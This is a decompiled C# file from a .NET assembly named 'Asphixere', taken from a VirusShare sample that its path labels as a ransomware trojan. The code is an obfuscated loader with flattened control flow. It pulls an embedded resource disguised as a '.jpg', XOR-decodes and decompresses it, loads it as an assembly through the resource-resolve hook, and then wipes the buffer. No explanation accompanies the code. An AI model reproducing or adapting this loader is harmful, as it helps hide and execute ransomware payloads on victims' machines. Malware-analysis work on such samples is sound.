// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Asphixere, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E674F363-54D5-428F-A0DB-A0B1E158EE32
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-38932e167026ed490ece630a999a9d5e83042fd308071dba8c9ec65744535b0d.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly 䣘尞뱊\uE7A5䦇춄庀鍵;

  static \u003CModule\u003E()
  {
label_0:
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.䙴ȇ㔄蒽暃\uF17Bꄻ䅩);
    int num1 = 1;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_0;
        case 2:
label_4:
          switch (num2)
          {
            case 0:
              goto label_0;
            case 1:
              goto label_8;
            default:
              switch (1)
              {
                case 0:
                  goto label_0;
                case 2:
                  goto label_7;
                case 3:
                  goto label_4;
                default:
                  num1 = 3;
                  continue;
              }
          }
        case 3:
          goto label_6;
        default:
          num2 = 1;
          goto case 2;
      }
    }
label_6:
    return;
label_7:
    return;
label_8:;
  }

  internal static Assembly 䙴ȇ㔄蒽暃\uF17Bꄻ䅩(object sender, ResolveEventArgs args)
  {
label_0:
    while ((object) \u003CModule\u003E.䣘尞뱊\uE7A5䦇춄庀鍵 == null)
    {
      int num1 = 6;
      int num2 = 10;
label_21:
      BinaryReader binaryReader;
      while (true)
      {
        int num3;
        int index;
        byte[] buffer;
        byte num4;
        Stream manifestResourceStream;
        switch (num2)
        {
          case 0:
            goto label_0;
          case 2:
            ++index;
            num3 = 25;
            break;
          case 3:
          case 10:
          case 11:
          case 12:
          case 15:
label_24:
            switch (num1)
            {
              case 0:
                goto label_0;
              case 1:
                goto label_26;
              case 2:
                goto label_14;
              case 3:
                goto label_15;
              case 4:
                goto label_19;
              case 5:
                num1 = 7;
                num2 = 15;
                continue;
              case 6:
                goto label_27;
              case 7:
                int num5 = index < buffer.Length ? 1 : 0;
                num1 = 1;
                num2 = 3;
                num3 = 24;
                if (num5 == 0)
                {
                  num3 = 17;
                  break;
                }
                break;
              default:
                num2 = 5;
                continue;
            }
            break;
          case 4:
label_15:
            binaryReader = new BinaryReader((Stream) new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress));
            num3 = 3;
            break;
          case 5:
label_26:
            buffer[index] = (byte) ((uint) buffer[index] ^ (uint) num4);
            num1 = 2;
            num3 = 20;
            break;
          case 6:
label_19:
            buffer = new byte[manifestResourceStream.Length];
            num3 = 10;
            break;
          case 7:
            index = 0;
            num1 = 5;
            num3 = 18;
            break;
          case 8:
label_14:
            num4 = (byte) ((int) num4 * (87013614 + (94691416 + 1635822247 - 896580913) ^ -1268547950 - 1608437310 - 497035810) % (1258494686 - 1167145228 - 91349202));
            num3 = 8;
            break;
          case 9:
label_18:
            num4 = (byte) (1516034594 - 615292928 ^ 900741658);
            num2 = 7;
            num3 = 26;
            break;
          case 13:
label_27:
            manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("扆䟰ꑽ☱\uAB1F\u2E67ﰖ厢.jpg");
            num3 = 7;
            break;
          case 14:
label_20:
            num1 = 3;
            num3 = 2;
            break;
          default:
            manifestResourceStream.Read(buffer, 0, buffer.Length);
            num2 = 9;
            num3 = 11;
            break;
        }
        while (true)
        {
          switch (num3)
          {
            case 0:
              goto label_0;
            case 2:
              num2 = 11;
              num3 = 12;
              continue;
            case 4:
            case 13:
            case 18:
            case 20:
              goto label_24;
            case 5:
              num2 = 12;
              num3 = 14;
              continue;
            case 6:
            case 11:
            case 12:
            case 14:
            case 22:
            case 24:
            case 26:
            case 28:
              goto label_21;
            case 7:
              num1 = 4;
              num3 = 5;
              continue;
            case 8:
              num2 = 2;
              num3 = 22;
              continue;
            case 9:
              num3 = 21;
              continue;
            case 10:
              num2 = 1;
              num3 = 6;
              continue;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              num2 = 14;
              num3 = 28;
              continue;
            case 19:
              goto label_18;
            case 21:
              goto label_28;
            case 23:
              goto label_20;
            case 25:
              goto label_23;
            case 27:
              goto label_26;
            default:
              num3 = 9;
              continue;
          }
        }
label_23:
        num1 = 7;
        goto label_24;
      }
label_28:
      try
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        int num6 = 5;
label_29:
        while (true)
        {
          int num7;
          switch (num6)
          {
            case 0:
              goto label_28;
            case 1:
            case 2:
label_35:
              switch (num1)
              {
                case 0:
                  goto label_28;
                case 1:
                  goto label_39;
                case 2:
                  goto label_34;
                default:
                  num7 = 1;
                  break;
              }
              break;
            case 3:
              num1 = 2;
              num7 = 3;
              break;
            case 4:
label_39:
              \u003CModule\u003E.䣘尞뱊\uE7A5䦇춄庀鍵 = Assembly.Load(numArray);
              num7 = 5;
              break;
            case 5:
              num1 = 1;
              num7 = 9;
              break;
            default:
              num7 = 4;
              break;
          }
          while (true)
          {
            switch (num7)
            {
              case 0:
                goto label_28;
              case 2:
              case 7:
              case 8:
                goto label_29;
              case 3:
                num6 = 1;
                num7 = 2;
                continue;
              case 4:
                goto label_35;
              case 5:
                goto label_37;
              case 6:
                goto label_39;
              case 9:
                num6 = 2;
                num7 = 8;
                continue;
              default:
                num6 = 4;
                num7 = 7;
                continue;
            }
          }
label_37:
          num6 = 3;
        }
label_34:
        Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
        break;
      }
      finally
      {
        binaryReader?.Dispose();
      }
    }
    while (Array.IndexOf<string>(\u003CModule\u003E.䣘尞뱊\uE7A5䦇춄庀鍵.GetManifestResourceNames(), args.Name) == -1)
    {
      switch (1)
      {
        case 0:
          continue;
        default:
          return (Assembly) null;
      }
    }
    return \u003CModule\u003E.䣘尞뱊\uE7A5䦇춄庀鍵;
  }
}
